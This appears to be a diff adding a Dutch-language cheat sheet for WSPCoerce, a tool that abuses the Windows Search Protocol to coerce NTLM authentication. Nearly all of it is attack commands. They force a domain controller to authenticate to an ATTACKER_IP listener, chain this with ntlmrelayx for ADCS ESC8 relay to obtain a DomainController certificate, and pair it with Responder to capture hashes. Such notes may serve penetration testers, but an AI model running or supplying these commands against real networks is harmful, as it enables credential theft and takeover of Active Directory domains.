@@ -1,0 +1,29 @@
+# WSPCoerce — MS-WSP (Windows Search Protocol) coercion
+# Forceert NTLM authenticatie via het Windows Search Protocol (MS-WSP)
+# Bruikbaar voor unconstrained delegation, ADCS relay, of credential capture
+#
+# === Vereisten ===
+# - Windows Search Service moet actief zijn op het doelwit (standaard op servers met Desktop Experience)
+# - Netwerk toegang tot het doelwit via SMB (445)
+#
+# === Syntax ===
+# WSPCoerce.exe <doelwit> <listener>
+#
+# === Voorbeelden ===
+
+# Basis coercion — forceer DC om te authenticeren naar listener
+WSPCoerce.exe DOELWIT LISTENER
+
+# Combinatie met ntlmrelayx voor ADCS relay (ESC8)
+# Terminal 1: relay opzetten
+python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Terminal 2: coerce triggeren
+WSPCoerce.exe DC ATTACKER_IP
+
+# Combinatie met Responder voor hash capture
+sudo responder -I eth0
+WSPCoerce.exe DC ATTACKER_IP
+
+# Noot: Complementair aan PetitPotam (MS-EFSR), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM)
+# Noot: Werkt mogelijk als PetitPotam gepatcht is — ander protocol pad
+# Noot: Download: https://github.com/yourfriend/WSPCoerce (of compileer zelf)
